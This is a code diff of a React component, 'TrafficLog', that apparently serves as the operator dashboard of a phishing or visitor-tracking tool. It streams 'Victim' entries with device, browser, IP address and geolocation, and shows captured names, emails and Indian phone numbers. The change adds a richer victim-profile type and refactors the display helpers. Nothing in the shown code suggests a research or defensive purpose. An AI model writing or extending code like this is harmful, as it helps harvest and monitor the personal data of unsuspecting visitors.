@@ -3,7 +3,7 @@
 import { useEffect, useRef } from "react";
 import { motion, AnimatePresence } from "framer-motion";
 import styles from "./TrafficLog.module.css";
-import { Victim } from "@/lib/sessions";
+import { Victim, VictimProfile } from "@/lib/sessions";
 
 /**
  * TrafficLog Component
@@ -13,7 +13,7 @@ import { Victim } from "@/lib/sessions";
  */
 
 interface TrafficLogProps {
-    entries: Victim[];
+    entries: (Victim | VictimProfile)[];
     maxEntries?: number;
     className?: string;
 }
@@ -34,8 +34,22 @@ export default function TrafficLog({
 
     const displayEntries = entries.slice(-maxEntries);
 
-    const getDeviceColor = (device: string) => {
-        switch (device) {
+    const getDeviceType = (entry: Victim | VictimProfile): string => {
+        if (typeof entry.device === 'object') {
+            return entry.device.type;
+        }
+        return entry.device;
+    };
+
+    const getBrowserName = (entry: Victim | VictimProfile): string => {
+        if (typeof entry.browser === 'object') {
+            return entry.browser.name;
+        }
+        return entry.browser;
+    };
+
+    const getDeviceColor = (deviceType: string) => {
+        switch (deviceType) {
             case "iOS":
                 return "#ff9500";
             case "Android":
@@ -87,45 +101,56 @@ export default function TrafficLog({
                             <span className={styles.waitingText}>Waiting for connections...</span>
                         </div>
                     ) : (
-                        displayEntries.map((entry, index) => (
-                            <motion.div
-                                key={entry.id}
-                                className={`${styles.logEntry} ${entry.name || entry.email ? styles.identified : ''}`}
-                                initial={{ opacity: 0, x: -20, height: 0 }}
-                                animate={{ opacity: 1, x: 0, height: "auto" }}
-                                exit={{ opacity: 0, x: 20, height: 0 }}
-                                transition={{ duration: 0.2 }}
-                            >
-                                <span className={styles.timestamp}>[{formatTime(entry.timestamp)}]</span>
-                                <span className={styles.arrow}>→</span>
-                                <span
-                                    className={styles.device}
-                                    style={{ color: getDeviceColor(entry.device) }}
+                        displayEntries.map((entry, index) => {
+                            const deviceType = getDeviceType(entry);
+                            const browserName = getBrowserName(entry);
+
+                            // Helper to get IP safely
+                            const getIP = (entry: Victim | VictimProfile): string => {
+                                if ('ip' in entry) return entry.ip;
+                                return entry.ipGeo?.ip || 'Unknown';
+                            };
+
+                            return (
+                                <motion.div
+                                    key={entry.id}
+                                    className={`${styles.logEntry} ${entry.name || entry.email ? styles.identified : ''}`}
+                                    initial={{ opacity: 0, x: -20, height: 0 }}
+                                    animate={{ opacity: 1, x: 0, height: "auto" }}
+                                    exit={{ opacity: 0, x: 20, height: 0 }}
+                                    transition={{ duration: 0.2 }}
                                 >
-                                    {entry.device}
-                                </span>
-                                <span className={styles.separator}>|</span>
-                                <span className={styles.browser}>{entry.browser}</span>
-                                <span className={styles.separator}>|</span>
-                                <span className={styles.ip}>{entry.ip}</span>
-                                {/* Show victim form data if available */}
-                                {(entry.name || entry.email || entry.phone) && (
-                                    <span className={styles.victimData}>
-                                        {entry.name && <span className={styles.victimName}>👤 {entry.name}</span>}
-                                        {entry.email && <span className={styles.victimEmail}>📧 {entry.email}</span>}
-                                        {entry.phone && <span className={styles.victimPhone}>📱 +91{entry.phone}</span>}
+                                    <span className={styles.timestamp}>[{formatTime(entry.timestamp)}]</span>
+                                    <span className={styles.arrow}>→</span>
+                                    <span
+                                        className={styles.device}
+                                        style={{ color: getDeviceColor(deviceType) }}
+                                    >
+                                        {deviceType}
                                     </span>
-                                )}
-                                <motion.span
-                                    className={styles.newBadge}
-                                    initial={{ opacity: 1, scale: 1.2 }}
-                                    animate={{ opacity: 0, scale: 1 }}
-                                    transition={{ delay: 2, duration: 0.5 }}
-                                >
-                                    NEW
-                                </motion.span>
-                            </motion.div>
-                        ))
+                                    <span className={styles.separator}>|</span>
+                                    <span className={styles.browser}>{browserName}</span>
+                                    <span className={styles.separator}>|</span>
+                                    <span className={styles.ip}>{getIP(entry)}</span>
+                                    {/* Show victim form data if available */}
+                                    {(entry.name || entry.email || entry.phone) && (
+                                        <span className={styles.victimData}>
+                                            {entry.name && <span className={styles.victimName}>👤 {entry.name}</span>}
+                                            {entry.email && <span className={styles.victimEmail}>📧 {entry.email}</span>}
+                                            {entry.phone && <span className={styles.victimPhone}>📱 +91{entry.phone}</span>}
+                                        </span>
+                                    )}
+                                    <motion.span
+                                        className={styles.newBadge}
+                                        initial={{ opacity: 1, scale: 1.2 }}
+                                        animate={{ opacity: 0, scale: 1 }}
+                                        transition={{ delay: 2, duration: 0.5 }}
+                                    >
+                                        NEW
+                                    </motion.span>
+                                </motion.div>
+                            );
+                        })
                     )}
                 </AnimatePresence>
 
